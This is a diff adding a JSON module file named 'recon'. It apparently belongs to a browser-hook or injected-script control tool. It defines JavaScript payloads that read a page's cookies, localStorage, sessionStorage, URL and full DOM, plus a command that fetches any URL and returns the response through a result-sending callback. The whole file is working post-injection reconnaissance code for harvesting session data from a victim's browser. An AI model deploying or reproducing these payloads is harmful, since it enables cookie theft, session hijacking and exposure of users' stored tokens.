@@ -1,0 +1,30 @@
+{
+  "name": "recon",
+  "commands": {
+    "cookies": {
+      "code": "document.cookie",
+      "description": "Get all cookies for the current page"
+    },
+    "localStorage": {
+      "code": "JSON.stringify(Object.fromEntries(localStorage))",
+      "description": "Get all localStorage entries serialised as JSON"
+    },
+    "sessionStorage": {
+      "code": "JSON.stringify(sessionStorage)",
+      "description": "Get all sessionStorage entries serialised as JSON"
+    },
+    "url": {
+      "code": "location.href",
+      "description": "Get the current page URL"
+    },
+    "dom": {
+      "code": "document.documentElement.outerHTML",
+      "description": "Get the full DOM as a string"
+    },
+    "fetch": {
+      "code": "void fetch('{0}').then(r=>r.text()).then(t=>_sendResult(m.id,t))",
+      "description": "Fetch a URL and return the response body as result",
+      "args": 1
+    }
+  }
+}
